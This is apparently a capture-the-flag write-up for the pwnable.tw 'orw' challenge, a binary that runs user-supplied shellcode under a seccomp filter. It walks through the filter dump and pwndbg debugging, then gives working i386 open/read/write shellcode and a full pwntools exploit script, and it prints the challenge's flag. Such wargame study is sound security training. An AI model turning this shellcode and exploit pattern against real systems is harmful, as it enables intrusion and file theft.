---
title: "[PWNABLE.TW] - orw"
published: 2025-02-12
description: "32-bits shellcode with seccomp rules"
image: "../og_img.png"
tags:
  - PWN
category: "Wargame"
draft: false
---

# Description

> Read the flag from /home/orw/flag.

> Only open read write syscall are allowed to use.

# Reverse Engineering

```sh
[*] '/home/alter/lab/pwnable.tw/orw/orw'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

Let's begin by looking at the `checksec` result: we know that the binary is 32-bit and has an executable stack. Now, let's analyze it using IDA.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf("Give my your shellcode:");
  read(0, &shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
```

From this pseudo-code, we can observe the following:

- Seccomp Setup: The function `orw_seccomp()` is called at the very beginning. This function sets up `seccomp` filters that restrict certain system calls. Although these filters are in place to limit dangerous operations, they may not block all actions, depending on the specific rules implemented.

- Prompting for Shellcode: The program then prints the message `Give my your shellcode:`, asking the user to supply `shellcode`.

- Reading the Shellcode: The `read(0, &shellcode, 0xC8u);` call reads up to 200 bytes (0xC8 in hexadecimal) from the standard input (file descriptor 0) and stores it in the buffer pointed to by `shellcode`.

- Executing the Shellcode: Finally, the code casts the buffer to a function pointer and calls it - `((void (*)(void))shellcode)();`.
This means that if the supplied `shellcode` is valid, the program will jump to and execute that code.

# Exploit Development

Using `seccomp-tools`, we can inspect the `seccomp` rules applied to the binary and determine which syscalls are allowed or blocked.

```sh
$ seccomp-tools dump ./orw
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 ```

By analyzing this output, we can understand how seccomp is filtering system calls:

Architecture Check:
The first two instructions verify that the binary is running on the ARCH_I386 (x86 32-bit) architecture. If the architecture does not match, execution jumps to instruction 0011, which allows the syscall.

Allowed Syscalls:
The following syscalls are explicitly permitted:

- `rt_sigreturn` (0xad)
- `sigreturn` (0x77)
- `exit_group` (0xfc)
- `exit` (0x01)
- `open` (0x05)
- `read` (0x03)
- `write` (0x04)
If any of these syscalls are invoked, execution jumps to instruction `0011`, which allows them.

From this, we can conclude that only basic file operations (`open`, `read`, and `write`) along with exit-related syscalls (exit, exit_group) are permitted. Syscalls such as `mprotect`, `execve`, or `dup2` are blocked, which significantly limits our ability to perform certain types of privilege escalation or shell spawning via standard techniques.

Given these constraints, the most viable approach is to craft a shellcode that adheres to the `seccomp` rules. Since we can open a file, read its contents, and write the output, we can design our shellcode to read the contents of a target file (e.g., a flag) and print it to stdout.

Now, let's write the shellcode that accomplishes this.

```py
    sc = asm('''

        push 0x6761
        push 0x6c662f77
        push 0x726f2f65
        push 0x6d6f682f
        mov eax, 5
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        int 0x80

        mov ebx, eax
        mov ecx, esp
        mov edx, 0x100
        mov eax, 3
        int 0x80

        mov ebx, 1
        mov eax, 4
        int 0x80
        ''', arch='i386')
```

But when I tried to run it locally, I ran into a problem:

```sh
pwndbg>

Program received signal SIGSEGV, Segmentation fault.
0x0804a060 in shellcode ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────
 EAX  0x804a060 (shellcode) ◂— 0x676168 /* 'hag' */
 EBX  0xf7f07000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 ECX  0x804a060 (shellcode) ◂— 0x676168 /* 'hag' */
 EDX  0xc8
 EDI  0xf7f5eb80 (_rtld_global_ro) ◂— 0
 ESI  0xfff15b74 —▸ 0xfff16fff ◂— '/home/alter/lab/pwnable.tw/orw/orw'
 EBP  0xfff15aa8 —▸ 0xf7f5f020 (_rtld_global) —▸ 0xf7f5fa40 ◂— 0
 ESP  0xfff15a9c —▸ 0x804858c (main+68) ◂— mov eax, 0
 EIP  0x804a060 (shellcode) ◂— 0x676168 /* 'hag' */
─────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────
 ► 0x804a060 <shellcode>       push   0x6761
   0x804a065 <shellcode+5>     push   0x6c662f77
   0x804a06a <shellcode+10>    push   0x726f2f65
   0x804a06f <shellcode+15>    push   0x6d6f682f
   0x804a074 <shellcode+20>    mov    eax, 5              EAX => 5
   0x804a079 <shellcode+25>    mov    ebx, esp            EBX => 0xfff15a8c ◂— '/home/orw/flag'
   0x804a07b <shellcode+27>    xor    ecx, ecx            ECX => 0
   0x804a07d <shellcode+29>    xor    edx, edx            EDX => 0
   0x804a07f <shellcode+31>    int    0x80 <SYS_open>
   0x804a081 <shellcode+33>    mov    ebx, eax
   0x804a083 <shellcode+35>    mov    ecx, esp
──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
00:0000│ esp 0xfff15a9c —▸ 0x804858c (main+68) ◂— mov eax, 0
01:0004│-008 0xfff15aa0 ◂— 1
02:0008│-004 0xfff15aa4 —▸ 0xfff15ac0 ◂— 1
03:000c│ ebp 0xfff15aa8 —▸ 0xf7f5f020 (_rtld_global) —▸ 0xf7f5fa40 ◂— 0
04:0010│+004 0xfff15aac —▸ 0xf7cfe519 (__libc_start_call_main+121) ◂— add esp, 0x10
05:0014│+008 0xfff15ab0 —▸ 0xfff16fff ◂— '/home/alter/lab/pwnable.tw/orw/orw'
06:0018│+00c 0xfff15ab4 ◂— 0x70 /* 'p' */
07:001c│+010 0xfff15ab8 —▸ 0xf7f5f000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x36f2c
────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────
 ► 0 0x804a060 shellcode
   1 0x804858c main+68
   2 0xf7cfe519 __libc_start_call_main+121
   3 0xf7cfe5f3 __libc_start_main+147
   4 0x80483f1 _start+33
```

We encountered a `SIGSEGV` (Segmentation Fault) despite our shellcode appearing to be correct. The root cause of this issue lies in the memory protection settings—specifically, the address `0x804a060` does not have `execution` permissions.
```sh
pwndbg> vmmap 0x804a060
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
     Start        End Perm     Size Offset File
 0x8049000  0x804a000 r--p     1000      0 /home/alter/lab/pwnable.tw/orw/orw
►0x804a000  0x804b000 rw-p     1000   1000 /home/alter/lab/pwnable.tw/orw/orw +0x60
0xf7cdd000 0xf7cfd000 r--p    20000      0 /usr/lib/i386-linux-gnu/libc.so.6
```

As seen in the memory map, the region `0x804a000 - 0x804b000` is marked as `rw-p` (read-write), but it lacks execution (`x`) permissions. This means that while we can write shellcode to this address, we cannot execute it, resulting in a `segmentation fault`.

This issue often arises due to differences in kernel versions between our local machine and the target server. Some kernel versions enforce stricter memory protections by default, which may cause unexpected behavior during exploitation.

To resolve this and continue debugging, we can manually grant execution permissions to this memory region using the following command in GDB:

```sh
call (int)mprotect(0x804a000, 0x1000, 7)
```
Here, `mprotect` is used to change the permissions of the memory at `0x804a000` with a size of `0x1000` (one memory page) to `7 (PROT_READ | PROT_WRITE | PROT_EXEC)`. This allows our shellcode to execute properly.

*Important*: We must issue this command before `orw_seccomp` is called. Once `orw_seccomp` is executed, it will enforce `seccomp` filters that block the `mprotect` syscall, making it impossible to modify memory permissions later.
```sh
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────
 EAX  0x8048548 (main) ◂— lea ecx, [esp + 4]
 EBX  0xf7ed5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 ECX  0xff8ec6f0 ◂— 1
 EDX  0xff8ec710 —▸ 0xf7ed5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 EDI  0xf7f2cb80 (_rtld_global_ro) ◂— 0
 ESI  0xff8ec7a4 —▸ 0xff8edfff ◂— '/home/alter/lab/pwnable.tw/orw/orw'
 EBP  0xff8ec6d8 —▸ 0xf7f2d020 (_rtld_global) —▸ 0xf7f2da40 ◂— 0
 ESP  0xff8ec6d4 —▸ 0xff8ec6f0 ◂— 1
 EIP  0x8048556 (main+14) ◂— sub esp, 4
──────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────
 ► 0x8048556 <main+14>    sub    esp, 4     ESP => 0xff8ec6d0 (0xff8ec6d4 - 0x4)
   0x8048559 <main+17>    call   orw_seccomp                 <orw_seccomp>

   0x804855e <main+22>    sub    esp, 0xc
   0x8048561 <main+25>    push   0x80486a0
   0x8048566 <main+30>    call   printf@plt                  <printf@plt>

   0x804856b <main+35>    add    esp, 0x10
   0x804856e <main+38>    sub    esp, 4
   0x8048571 <main+41>    push   0xc8
   0x8048576 <main+46>    push   shellcode
   0x804857b <main+51>    push   0
   0x804857d <main+53>    call   read@plt                    <read@plt>
──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ esp 0xff8ec6d4 —▸ 0xff8ec6f0 ◂— 1
01:0004│ ebp 0xff8ec6d8 —▸ 0xf7f2d020 (_rtld_global) —▸ 0xf7f2da40 ◂— 0
02:0008│+004 0xff8ec6dc —▸ 0xf7ccc519 (__libc_start_call_main+121) ◂— add esp, 0x10
03:000c│+008 0xff8ec6e0 —▸ 0xff8edfff ◂— '/home/alter/lab/pwnable.tw/orw/orw'
04:0010│+00c 0xff8ec6e4 ◂— 0x70 /* 'p' */
05:0014│+010 0xff8ec6e8 —▸ 0xf7f2d000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x36f2c
06:0018│+014 0xff8ec6ec —▸ 0xf7ccc519 (__libc_start_call_main+121) ◂— add esp, 0x10
07:001c│ ecx 0xff8ec6f0 ◂— 1
────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► 0 0x8048556 main+14
   1 0xf7ccc519 __libc_start_call_main+121
   2 0xf7ccc5f3 __libc_start_main+147
   3 0x80483f1 _start+33
──────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> call (int)mprotect(0x804a000, 0x1000, 7)
$1 = 0
pwndbg> ni
0x08048559 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────
 EAX  0x8048548 (main) ◂— lea ecx, [esp + 4]
 EBX  0xf7ed5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 ECX  0xff8ec6f0 ◂— 1
 EDX  0xff8ec710 —▸ 0xf7ed5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 EDI  0xf7f2cb80 (_rtld_global_ro) ◂— 0
 ESI  0xff8ec7a4 —▸ 0xff8edfff ◂— '/home/alter/lab/pwnable.tw/orw/orw'
 EBP  0xff8ec6d8 —▸ 0xf7f2d020 (_rtld_global) —▸ 0xf7f2da40 ◂— 0
*ESP  0xff8ec6d0 ◂— 1
*EIP  0x8048559 (main+17) ◂— call orw_seccomp
──────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────
   0x8048556 <main+14>    sub    esp, 4     ESP => 0xff8ec6d0 (0xff8ec6d4 - 0x4)
 ► 0x8048559 <main+17>    call   orw_seccomp                 <orw_seccomp>
        arg[0]: 1
        arg[1]: 0xff8ec6f0 ◂— 1
        arg[2]: 0xf7f2d020 (_rtld_global) —▸ 0xf7f2da40 ◂— 0
        arg[3]: 0xf7ccc519 (__libc_start_call_main+121) ◂— add esp, 0x10

   0x804855e <main+22>    sub    esp, 0xc
   0x8048561 <main+25>    push   0x80486a0
   0x8048566 <main+30>    call   printf@plt                  <printf@plt>

   0x804856b <main+35>    add    esp, 0x10
   0x804856e <main+38>    sub    esp, 4
   0x8048571 <main+41>    push   0xc8
   0x8048576 <main+46>    push   shellcode
   0x804857b <main+51>    push   0
   0x804857d <main+53>    call   read@plt                    <read@plt>
──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ esp 0xff8ec6d0 ◂— 1
01:0004│-004 0xff8ec6d4 —▸ 0xff8ec6f0 ◂— 1
02:0008│ ebp 0xff8ec6d8 —▸ 0xf7f2d020 (_rtld_global) —▸ 0xf7f2da40 ◂— 0
03:000c│+004 0xff8ec6dc —▸ 0xf7ccc519 (__libc_start_call_main+121) ◂— add esp, 0x10
04:0010│+008 0xff8ec6e0 —▸ 0xff8edfff ◂— '/home/alter/lab/pwnable.tw/orw/orw'
05:0014│+00c 0xff8ec6e4 ◂— 0x70 /* 'p' */
06:0018│+010 0xff8ec6e8 —▸ 0xf7f2d000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x36f2c
07:001c│+014 0xff8ec6ec —▸ 0xf7ccc519 (__libc_start_call_main+121) ◂— add esp, 0x10
────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► 0 0x8048559 main+17
   1 0xf7ccc519 __libc_start_call_main+121
   2 0xf7ccc5f3 __libc_start_main+147
   3 0x80483f1 _start+33
──────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
     Start        End Perm     Size Offset File
 0x8048000  0x8049000 r-xp     1000      0 /home/alter/lab/pwnable.tw/orw/orw
 0x8049000  0x804a000 r--p     1000      0 /home/alter/lab/pwnable.tw/orw/orw
 0x804a000  0x804b000 rwxp     1000   1000 /home/alter/lab/pwnable.tw/orw/orw
0xf7cab000 0xf7ccb000 r--p    20000      0 /usr/lib/i386-linux-gnu/libc.so.6
0xf7ccb000 0xf7e4d000 r-xp   182000  20000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7e4d000 0xf7ed2000 r--p    85000 1a2000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7ed2000 0xf7ed3000 ---p     1000 227000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7ed3000 0xf7ed5000 r--p     2000 227000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7ed5000 0xf7ed6000 rw-p     1000 229000 /usr/lib/i386-linux-gnu/libc.so.6
0xf7ed6000 0xf7ee0000 rw-p     a000      0 [anon_f7ed6]
0xf7eee000 0xf7ef0000 rw-p     2000      0 [anon_f7eee]
0xf7ef0000 0xf7ef4000 r--p     4000      0 [vvar]
0xf7ef4000 0xf7ef6000 r-xp     2000      0 [vdso]
0xf7ef6000 0xf7ef7000 r--p     1000      0 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7ef7000 0xf7f1c000 r-xp    25000   1000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7f1c000 0xf7f2b000 r--p     f000  26000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7f2b000 0xf7f2d000 r--p     2000  34000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7f2d000 0xf7f2e000 rw-p     1000  36000 /usr/lib/i386-linux-gnu/ld-linux.so.2
0xff8cd000 0xff8ef000 rwxp    22000      0 [stack]
```

- Exploit:
```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./orw', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''

        b*main+14
        call (int)mprotect(0x804a000, 0x1000, 7)
        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def exploit():

    # Path: /home/orw/flag
    # /hom -> 0x6d6f682f
    # e/or -> 0x726f2f65
    # w/fl -> 0x6c662f77
    # ag -> 0x6761

    sc = asm('''

        push 0x6761
        push 0x6c662f77
        push 0x726f2f65
        push 0x6d6f682f
        mov eax, 5
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        int 0x80

        mov ebx, eax
        mov ecx, esp
        mov edx, 0x100
        mov eax, 3
        int 0x80

        mov ebx, 1
        mov eax, 4
        int 0x80

        ''', arch='i386')

    sa(b':', sc)

    interactive()

if __name__ == '__main__':
  exploit()
```

# Get flag

```sh
alter ^ Sol in ~/lab/pwnable.tw/orw
$ ./xpl.py REMOTE chall.pwnable.tw 10001
[*] '/usr/lib/i386-linux-gnu/libc.so.6'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to chall.pwnable.tw on port 10001: Done
[*] Switching to interactive mode
FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}
```
